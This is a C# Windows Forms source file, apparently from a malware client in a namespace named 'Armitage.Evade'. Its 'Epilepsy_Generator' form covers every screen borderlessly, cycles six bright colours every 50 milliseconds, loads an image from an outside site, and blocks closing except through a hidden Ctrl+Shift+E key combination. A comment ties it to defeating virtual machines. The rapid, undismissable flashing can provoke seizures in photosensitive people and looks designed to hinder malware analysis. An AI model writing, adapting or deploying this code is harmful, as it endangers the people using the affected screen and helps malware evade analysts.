using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Client.Armitage.Watchers.Screen_Watcher;

namespace Client.Armitage.Evade
{
    public partial class Epilepsy_Generator : Form
    {
        /// <summary>
        /// fuck vms
        /// </summary>
        public Epilepsy_Generator()
        {

            InitializeComponent();

        }
        private Color[] _colors = new Color[] { Color.Red, Color.Green, Color.Blue, Color.Black, Color.Magenta, Color.Maroon };
        private void Epilepsy_Generator_Load(object sender, EventArgs e)
        {
            this.FormBorderStyle = FormBorderStyle.None;

            int screenLeft = SystemInformation.VirtualScreen.Left;

            int screenTop = SystemInformation.VirtualScreen.Top;

            int screenWidth = 0;

            int screenHeight = 0;

            foreach (Screen screen in Screen.AllScreens)
            {
                DEVMODE dm = new DEVMODE();

                dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));

                EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);

                screenWidth += dm.dmPelsWidth;

                screenHeight += dm.dmPelsHeight;
            }

            this.Location = new Point(screenLeft, screenTop); this.Width = screenWidth; this.Height = screenHeight;

            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();

            timer.Interval = 50;

            timer.Tick += Timer_Tick;

            timer.Start();

            KeyPreview = true;

            KeyDown += Epilepsy_Generator_KeyDown;

            MouseMove += Epilepsy_Generator_MouseMove;

            pictureBox1.ImageLocation = "https://img1.gelbooru.com//images/d5/a3/d5a34055c877fda6d96ce7ea9367dd77.png";

            pictureBox1.MouseMove += Epilepsy_Generator_MouseMove;
        }

        private void Epilepsy_Generator_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Left = e.X - (label1.Width / 2);
            label1.Top = e.Y + 50;
        }

        private bool _cancellable = true;
        private void Epilepsy_Generator_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.Shift && e.KeyCode == Keys.E)
            {
                _cancellable = false;
                this.Close();
            }
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            if (_colindex > _colors.Length - 1) _colindex = 0;
            SetBackColor(_colors[_colindex]);
            this.Update();
            this.UpdateBounds();
            _colindex++;
        }

        private int _colindex = 0;
        private void SetBackColor(Color color)
        {
            this.BackColor = color;
        }

        private void Closing(object sender, FormClosingEventArgs e)
        {
            if (_cancellable)
                e.Cancel = true;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
